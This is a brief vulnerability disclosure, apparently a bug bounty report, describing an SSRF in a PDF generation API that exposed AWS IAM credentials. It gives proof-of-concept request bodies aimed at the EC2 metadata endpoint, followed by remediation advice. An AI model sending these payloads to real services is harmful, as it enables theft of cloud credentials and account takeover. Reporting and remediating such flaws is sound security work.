# SSRF to Internal AWS Metadata Exposure

**Severity:** Critical  
**CVSS:** 9.1  
**Type:** Server-Side Request Forgery (SSRF)  

## Summary

SSRF vulnerability in a PDF generation feature allowed reading AWS EC2 instance metadata, leading to exposure of IAM credentials.

## Proof of Concept

```
POST /api/generate-pdf
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

Response contained IAM role name, then:
```
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"}
```

Returned `AccessKeyId`, `SecretAccessKey`, and `Token`.

## Impact

Full AWS account compromise via stolen temporary IAM credentials.

## Remediation

- Validate and whitelist allowed URLs
- Block requests to `169.254.169.254` and `fd00:ec2::254`
- Use IMDSv2 which requires session tokens
- Deploy WAF rules for SSRF patterns
